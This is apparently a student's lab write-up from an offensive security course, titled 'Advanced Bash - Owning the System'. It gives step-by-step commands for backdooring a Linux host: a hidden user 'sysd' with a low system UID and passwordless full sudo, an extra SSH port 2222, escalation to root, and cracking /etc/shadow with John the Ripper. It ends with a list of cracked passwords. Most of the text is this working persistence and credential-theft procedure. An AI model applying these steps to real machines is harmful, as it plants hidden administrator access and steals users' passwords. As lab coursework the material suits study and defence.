Advanced Bash - Owning the System
Step 1: Shadow People
Create a secret user named sysd. Make sure this user doesn't have a home folder created:
* “useradd sysd” (# adduser will create a home folder and profile) 
Give your secret user a password:

* “passwd sysd” (# sysdpassw0rd)
Give your secret user a system UID < 1000:

* “usermod -u 523 sysd”
Give your secret user the same GID:

* “groupmod -g 523 sysd” 
Give your secret user full sudo access without the need for a password:

* “sysd        ALL=(ALL:ALL) NOPASSWD:ALL”
Test that sudo access works without your password:

 “sudo -l”

Step 2: Smooth Sailing
1. Edit the sshd_config file:

“nano /etc/ssh/sshd_config” add “Port 2222” below port 22 and unhash them

Step 3: Testing Your Configuration Update
Restart the SSH service:
* “service ssh restart”
Exit the root account:

* “exit” 
SSH to the target machine using your sysd account and port 2222:

* “ssh sysd@192.168.6.105 -p 2222”
Use sudo to switch to the root user:
* “sudo su ”
Step 4: Crack All the Passwords
SSH back to the system using your sysd account and port 2222:

* “ssh sysd@192.168.6.105 -p 2222”
Escalate your privileges to the root user. Use John to crack the entire /etc/shadow file:
* “”sudo su” and then “john /etc/shadow”
Results:
-computer (stallman)
-freedom (babbage)
-trustno1 (mitnik)
-dragon (lovelace)
-lakers (turing)
-passw0rd (sysadmin)
